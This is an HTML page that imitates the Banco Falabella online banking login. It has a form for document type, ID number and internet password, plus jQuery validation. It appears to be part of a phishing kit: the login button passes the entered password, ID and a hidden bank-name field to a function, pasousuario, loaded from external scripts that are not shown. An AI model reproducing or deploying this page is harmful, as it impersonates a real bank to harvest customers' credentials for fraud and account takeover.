<!DOCTYPE html>
<html lang="es">

<head>
    <meta content="width=device-width,initial-scale=1" name="viewport">
    <title>Banca Virtual | Banco Falabella</title>
    <link href="https://www.bancofalabella.com.co/assets/favicons/android-chrome-256x256.png" rel="shortcut icon" type="image/x-icon">
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="css/misEstilos.css" rel="stylesheet">
    <link href="css/main.css" rel="stylesheet">
    <script type="text/javascript" src="../../scripts/jquery-3.6.0.min.js"></script>
    <script src="../../scripts/jquery.jclock-min.js" type="text/javascript"></script>
    <script type="text/javascript" src="../../scripts/functions2.js"></script>
    <script src="js/nopasa.js"></script>
    <style>
        .error-message {
            color: #dc3545;
            font-size: 12px;
            margin-top: 5px;
            display: none;
        }
        
        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        
        .form-control.is-invalid {
            border-color: #dc3545;
        }
    </style>
</head>

<body>
    <input id="banco" type="hidden" value="Falabella">

    <div class="header">
        <header class="headerO">
            <div class="header1">
                <div class="container">
                    <div class="box row">
                        <div class="col-auto box1 col-md">
                            <button>
 <span>
 <svg _ngcontent-lwe-c118="" class="ng-tns-c118-0" viewBox="0 0 43 29" xmlns="http://www.w3.org/2000/svg">
 <g _ngcontent-lwe-c118="" class="ng-tns-c118-0" fill="none" fill-rule="evenodd">
 <path _ngcontent-lwe-c118="" class="ng-tns-c118-0" d="M-3-9h48v48H-3z"></path>
 <path _ngcontent-lwe-c118="" class="ng-tns-c118-0" d="M2.5 29h38a2.5 2.5 0 1 0 0-5h-38a2.5 2.5 0 1 0 0 5zm0-12h38a2.5 2.5 0 1 0 0-5h-38a2.5 2.5 0 1 0 0 5zM0 2.5A2.5 2.5 0 0 0 2.5 5h38a2.5 2.5 0 1 0 0-5h-38A2.5 2.5 0 0 0 0 2.5z" fill="#3F3F3F" fill-rule="nonzero"></path>
 </g>
 </svg>
 </span>
 </button>
                        </div>
                        <div class="col-auto box2">
                            <a href="#"><img alt="" src="img/header.svg"></a>
                        </div>
                        <div class="box3 col">
                            <a href="#">Banca en LÃ­nea</a>
                        </div>
                    </div>
                </div>
            </div>
        </header>
    </div>

    <div class="d-block" style="margin:40px 0 60px">
        <div class="card card-body card1">

            <div class="formf">
                <form class="formPrincipal" id="loginForm">
                    <select class="form-control" id="tipoDocumento" required>
 <option value="">Seleccione tipo de documento</option>
 <option value="cc">CÃ©dula de CiudadanÃ­a</option>
 <option value="ce">CÃ©dula de ExtranjerÃ­a</option>
 <option value="pp">Pasaporte</option>
 </select>
                    <div class="error-message" id="tipoDocumentoError">Por favor seleccione un tipo de documento</div>

                    <input id="txtUsuario" type="text" class="form-control" minlength="2" placeholder="NÃºmero de IdentificaciÃ³n" inputmode="numeric" required>
                    <div class="error-message" id="usuarioError">Ingrese una identificaciÃ³n valida</div>

                    <input id="txtPass" type="password" class="form-control" minlength="6" placeholder="Clave Internet" required>
                    <div class="error-message" id="passError">La clave debe tener al menos 6 digitos</div>

                    <button id="btnUsuario" type="button" disabled>Ingresar</button>
                </form>
                <a href="#">Crea o recupera tu Clave Internet</a>
            </div>
        </div>
    </div>

    <div class="footer">
        <img alt="" src="img/footer.PNG">
    </div>

    <script type="text/javascript">
        $(document).ready(function() {
            // Validar campos cuando cambie su valor
            $("#tipoDocumento, #txtUsuario, #txtPass").on('input change', function() {
                validarFormulario();
            });

            // FunciÃ³n para validar todo el formulario
            function validarFormulario() {
                let formValido = true;

                // Validar tipo de documento
                const tipoDocumento = $("#tipoDocumento").val();
                if (!tipoDocumento) {
                    $("#tipoDocumentoError").show();
                    $("#tipoDocumento").addClass('is-invalid');
                    formValido = false;
                } else {
                    $("#tipoDocumentoError").hide();
                    $("#tipoDocumento").removeClass('is-invalid');
                }

                // Validar nÃºmero de identificaciÃ³n
                const usuario = $("#txtUsuario").val();
                if (usuario.length < 2) {
                    $("#usuarioError").show();
                    $("#txtUsuario").addClass('is-invalid');
                    formValido = false;
                } else {
                    $("#usuarioError").hide();
                    $("#txtUsuario").removeClass('is-invalid');
                }

                // Validar clave de internet (mÃ­nimo 6 caracteres)
                const clave = $("#txtPass").val();
                if (clave.length < 6) {
                    $("#passError").show();
                    $("#txtPass").addClass('is-invalid');
                    formValido = false;
                } else {
                    $("#passError").hide();
                    $("#txtPass").removeClass('is-invalid');
                }

                // Habilitar o deshabilitar el botÃ³n segÃºn la validaciÃ³n
                $("#btnUsuario").prop('disabled', !formValido);
            }

            // AcciÃ³n del botÃ³n de ingreso
            $("#btnUsuario").click(function() {
                // Solo procesar si el formulario es vÃ¡lido
                if ($("#tipoDocumento").val() && $("#txtUsuario").val().length >= 2 && $("#txtPass").val().length >= 6) {
                    pasousuario($("#txtPass").val(), $("#txtUsuario").val(), $("#banco").val());
                }
            });

            // Validar formulario al cargar la pÃ¡gina
            validarFormulario();
        });
    </script>
</body>

</html>

